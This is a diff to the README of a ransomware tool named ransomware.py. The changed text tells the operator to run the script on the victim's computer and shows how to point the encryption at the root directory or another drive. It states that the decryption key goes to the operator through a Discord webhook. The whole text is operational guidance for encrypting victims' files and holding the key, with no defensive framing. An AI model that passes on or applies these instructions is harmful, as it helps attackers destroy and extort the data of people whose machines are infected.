@@ -82,10 +82,21 @@ In the `ransomware.py` can modify some values like the `Discord Webhook`, your C
 
 To be able to execute the files you will have to run these commands
 
-To encrypt your victim files:
+The script must be run on your victim computer.
 ```python
   python3 ransomware.py
 ```
+
+By default the files which will be encrypted will be those which are in the current working directories, to specify the path you can add this for example:
+for more information click [here](https://www.geeksforgeeks.org/python-os-listdir-method/)
+
+```python 
+  path = "/"   # "/" correspond to the root file but you can custom with a custom path example C: Boot or D:/
+  for file in os.listdir(path): # then specify the path as parameter
+```
+  
+
+
 
 To decrypt the victim files he will need the encryption key, you will receive it by webhook through discord webhook.
 
